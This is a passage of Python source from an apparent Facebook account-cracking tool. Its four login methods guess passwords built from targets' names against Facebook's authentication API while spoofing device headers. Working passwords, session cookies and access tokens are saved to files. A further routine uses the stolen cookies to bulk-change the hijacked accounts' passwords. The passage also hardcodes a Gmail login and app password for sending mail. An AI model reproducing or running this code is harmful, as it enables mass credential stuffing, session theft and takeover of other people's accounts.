'X-FB-Net-HNI': '45201',
'X-FB-SIM-HNI': '45204',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-Connection-Quality':'EXCELLENT',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'unknown',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#print(q)
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"					    
					p('\r\033[1;92m[ISHMUM-OK] %s | %s \033[1;97m '%(uid,pw))		
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
				    #(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
					open('/sdcard/ISHMUM_OK.txt','a').write(uid+'|'+pw+'\n')					
					open('/sdcard/ISHMUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;35m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ISHMUM] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,441)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["Telenor","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/Realme;FBBD/Realme;FBDV/RMX3357;FBSV/13;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				headers={'Host': 'b-graph.facebook.com',
'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
'X-Fb-Connection-Quality': 'EXCELLENT',
'X-Fb-Sim-Hni': '41001',
'X-Fb-Net-Hni': '41001',
'User-Agent':ishmum_ua,
'X-Fb-Connection-Bandwidth': '24714729',
'Content-Type': 'application/x-www-form-urlencoded',
'X-Fb-Connection-Type': 'WIFI',
'X-Fb-Device-Group': '4503',
'X-Tigon-Is-Retry': 'False',
'X-Fb-Friendly-Name': 'authenticate',
'X-Fb-Request-Analytics-Tags': 'unknown',
'Priority': 'u=3, i',
'Accept-Encoding': 'gzip, deflate',
'X-Fb-Http-Engine': 'Liger',
'X-Fb-Client-Ip': 'True',
'X-Fb-Server-Cluster': 'True',
}

				data = {'adid' : str(uuid.uuid4()),
'format' : 'json',
'device_id' : str(uuid.uuid4()),
'email' : uid,
'password' : pw,
'generate_analytics_claim' : '1',
'community_id' : '',
'linked_guest_account_userid' :'',
'cpl' : 'true',
'try_num' : '1',
'family_device_id' : str(uuid.uuid4()),
'secure_family_device_id' : str(uuid.uuid4()),
'sim_serials' : ["00920088911210748054"],
'credentials_type' : 'password',
'fb4a_shared_phone_cpl_experiment' : 'fb4a_shared_phone_nonce_cpl_at_risk_v3',
'fb4a_shared_phone_cpl_group' : 'enable_v3_at_risk',
'enroll_misauth' : 'false',
'generate_session_cookies' : '1',
'error_detail_type' : 'button_with_disabled',
'source' : 'login',
'generate_machine_id' : '1',
'jazoest' : '22377',
'meta_inf_fbmeta' : 'V2_UNTAGGED',
'advertiser_id' : str(uuid.uuid4()),
'encrypted_msisdn': '',
'currently_logged_in_userid' : '0',
'locale' : 'en_US',
'client_country_code' : 'US',
'fb_api_req_friendly_name' : 'authenticate',
'fb_api_caller_class' : 'Fb4aAuthHandler',
'api_key' : '882a8490361da98702bf97a021ddc14d',
'sig' : 'e5abae6d6564813bfadc6dcd42256834',
'access_token' : '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
				q = requests.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers,verify=True).json()
				#rint(q)
				if "session_key" in q:
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					token = q["access_token"]
					open('/sdcard/COOKIE TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ISHMUM OK] %s | %s \033[1;97m '%(uid,pw))
					#(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[💥]COOOKIIE :\033[1;33m "+cok)
					open('/sdcard/ISHMUM_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ISHMUM_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method2(uid,nm,pwx)
		except Exception as e:
			self.method2(uid,nm,pwx)
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ISHMUM] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
			facebook_version = f'{random.randint(10,440)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
			fbbv = str(random.randint(10000000, 99999999))
			fbrv = str(random.randint(10000000, 99999999))
			fbsv = f"{random.uniform(4.0, 10.0):.1f}"
			density = random.choice(["2.0","2.25","2.75","3.0","3.25","3 75"])
			width = random.randint(720, 1440)
			height = random.randint(1080, 2560)
			fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","tl-PH","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
			fbcr = random.choice(["PLDT","Smart Communications","Globe Telecom","SMART","Globe","Smart-PH","Globe-PH","DITO Telecommunity","PLDT-PH","Sky","ABS-CBN","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
			fban = random.choice(["FB4A", "FB5A", "FB6A"])
			fbpn = random.choice(["com.facebook.katana", "com.facebook.orca", "com.facebook.lite"])
			ishmum_ua = f"[FBAN/{fban};FBAV/{facebook_version};FBLC/en_US;FBBV/{fbbv};FBCR/{fbcr};FBMF/LGE;FBBD/lge;FBDV/LG-H901;FBSV/7.0;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "login",
"email": uid,
"password": pw,
"access_token": "256002347743983|374e60f8b9bb6b8cbb30f78030438895",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_US",
"client_country_code": "en_US",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent':ishmum_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': f'nid={nid};pid=Main;tid={tid};nc=1;fc=0;bc=0;cid={connection_token()}',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': connection_token()}
				q = ses.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[ISHMUM-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/ISHMUM_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					#os.system('espeak -a 300 " ISHMUM,  Ok,  id"')
					open('/sdcard/ISHMUM_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;35m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [ISHMUM] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			m4url = "https://iquaqib.vercel.app/ua"
			m4ua = requests.get(m4url).text
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': m4ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#rint(q)
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[ISHMUM-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/ISHMUM_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/ISHMUM_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[ISHMUM-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/ISHMUM_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
	
class Join:
	def __init_(self):
		logo()
		#s.system("xdg-open https://wa.me/+923091528637")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/FVJGj8R6Clc1EYvmzwfoMS')
		Ishmum().Ishmum()
	def Facebook(self):
		os.system('xdg-open https://www.facebook.com/shazir.iqbal.786')
		Ishmum().Ishmum()

class Grep:
	def __init__(self):
		logo()

	def remove_links(self):
		file = input(" [✓] File Path :- ")
		try:
			open(file,'r').read()
			print("   [✓]   Example  /sdcard/file1.txt  ")
			out = input("  [=] Save Path :- ")
			os.system('touch '+out)
			os.system('sort -r '+file+' | uniq > '+out)
			p("  [ All double links are Removed ] ")
			p(" [•] Your File Saved in %s "%(out))
			input("  [ Press Enter To Go Back ] ")
			time.sleep(1)
			self.remove_links()
		except:
			p("  [ File Not Found ]  ");sp(1);self.remove_links()


	def links_only(self):
		os.system("rm -rf .tmp.txt")
		try:
			p(" [  Example  :-  /sdcard/file.txt  ] ")
			file = input(" [•|•] Enter File Path :- ")
			line()
			p("   Example  :-  /sdcard/file1.txt  ")
			sav = input(" [✓] Enter Save Path :- ")
			line()
			p(" [•]  Example  :- 1 , 2 , 3 , 4 , 5 , 6 etc  ")
			try:
				limit = int(input(" [•|•] how many links you wants to grep :- "))
				line()
			except:
				limit = 1
			t = open(file,"r").read().splitlines()
			xx = open(".tmp.txt","a")
			for x in t:
				uid = x.split("|")[0]
				xx.write(uid+'\n')
				xx.close()
			p("	 Example  :-  100089,88,87 etc")
			for n in range(limit):
				print(open(".tmp.txt","r").read().splitlines())
				digit = int(input(" [•|•] Enter Digit %s :- "%(n+1)))
				line()
				os.system('cat .tmp.txt | grep '+str(digit)+' >>'+sav+' ')
				p(" [   Your File Saved in :- %s ]  "%(sav))
				input(" [ Press Enter To go Back ] ")
				sp(1)
				self.links_only()
		except Exception as e:
				print(" [^=^] Your File Not Found :( ")
				sp(2);self.links_only()


	def with_names(self):
		logo()
		finput = input(' [•] Put File Path :')
		sav= input(' [•] Put File Save Path : ')
		digits = input(' [•] Put Digits : ').split(',')
		spc=[]
		try:
			file = open(finput,'r').read().splitlines()
			xx = open(sav,'a')
			for mix in file:
				uid = mix.split('|')[0]
				nm = mix.split('|')[1]
				for digit in digits:
					if digit in uid:
						if uid not in spc:
							if uid.startswith(digit):
								xx.write(uid+'|'+nm+'\n')
			p(' [•] Grepping Done!!!!!')
			p(' [•] Your File Saved in : %s '%(sav))
		except FileNotFoundError:
			print(' [•] File Not Found !!!!')
class Server:
	def report(self):
		logo()
		print(" [•] Ex Cp issues/New updates Etc ")
		print(' [•] Please Describe issues in details\n [•] It will be send to Admin ')
		line()
		issue = input(' [•] Describe your Problem : ')
		name = input(' [•] Enter Your Name :- ')
		email = input(' [•] Enter Your Email/Contact/Fb Link : ')
		print(' [•] Sending Your Appeal .....')
		form = f'	__________________\n	Full Name : {name} \n	Email  : {email} \n	Issues : {issue} '
		TEXT = form
		SUBJECT = " Dilute Codes Users Feedback"
		message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
		se = "serverdilute@gmail.com"
		rse = "serverdilute@merry.pink"
		username = "serverdilute@gmail.com"
		password = "usqscwnpoyehoytc"
		server = smtplib.SMTP('smtp.gmail.com', 587)
		server.ehlo()
		server.starttls()
		server.login(username, password)
		server.sendmail(se, rse, message)
		print(" [•] Your Appleal Has been Submitted ")
		print(form)
		exit()

		
class automation:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def menu(self):
		logo()
		
		p(" [1] Facebook Password Change Menu ")
		p(' [2] Cut Used File lines ')
		am = input(" [•] Select an option : ")
		if am == "1":self.iAmPasswordManager()
		elif am == "2":self.used_cutter()
		else:
			p(" [•] wrong select!! ");sp(2);self.menu()
	def used_cutter(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File Splitted Complete")
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : Aqib Ali ")
		line()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmApprovelSystem()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	
	def bulk_password(self):
		sav = "/sdcard/dilute_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "Jani786"
		logo()
		p(" [•] Password Changer By : Aqib Ali ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			pw = x.split('|')[1]
			cok = x.split('|')[2]
			cookies = {"cookie":cok}
			try:
				r= requests.get("https://mbasic.facebook.com/settings/security/password/?", headers=cookies).text
				r= r.replace("amp;","")
			except CE:
				print(" [•] Check Your Internet Unexpected Stopped ! ")
				exit()
			
			next = re.findall('action\="(.*?)"',r)[1]
			data = {
		"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
		"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
		"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
			po = requests.post("https://mbasic.facebook.com"+str(next),headers=cookies,data=data).text
			po = po.replace("amp;","")
			if 'Password changed' in po:
				p(" [•]  \033[1;92m✓ Password Changed Succesfully : \033[1;97m%s "%(uid))
				open(sav,"a").write(uid+'|'+np+'\n')
			else:
				p(" [•]\033[1;91m Failed To Changed Password : \033[1;97m%s "%(uid))
		line()
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "Jani786"
		logo()
		p(" [•] Password Changer By : Aqib Ali ")
		line()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		cookies = {'cookie':cok}
		r= requests.get("https://mbasic.facebook.com/settings/security/password/?",headers=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
	"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
	"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
	"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
	"password_old":pw,
	"password_new":np,
	"password_confirm":np,
	"save": "Save changes"
	}
		po = requests.post("https://mbasic.facebook.com"+str(next),headers=cookies,data=data).text
		print(po)
		po = po.replace("amp;","")
		if 'Password changed' in po:
			p(" [•]  ✓ Password Changed Succesfully ")
			
			sp(2)
			input(" [•] Press Enter To Go Backk")
			self.iAmPasswordManager()
		else:
			p(" [•] Failed To Changed Password ")
	def iAmFreeMode(self,cookies,r):
		for x in re.findall('action\=\"(.*?)"',r):
			if "/zero/optin/write/?" in x:
				next = x
		data ={}
		fb_dtsg = re.search('name="fb_dtsg" value="(.*?)"',r).group(1)
		jazoest = re.search('name="jazoest" value="(.*?)"',r).group(1)
		data.update(
		{
		'fb_dtsg':fb_dtsg,
		'jazoest':jazoest,
		'submit':'Continue'
		}
		)
		po = requests.post('https://free.facebook.com'+str(x),cookies=cookies,data=data,allow_redirects=False)
	
	def change_default(self):
		logo()
		
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "Jani786"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New Default Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be Six Characters More .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")

		self.iAmPasswordManager()







if __name__=="__main__":
	#anary_detect()
	Ishmum().Ishmum()
	#Ishmum().method2('100093614310527','Right123',['55556666'])
Footer
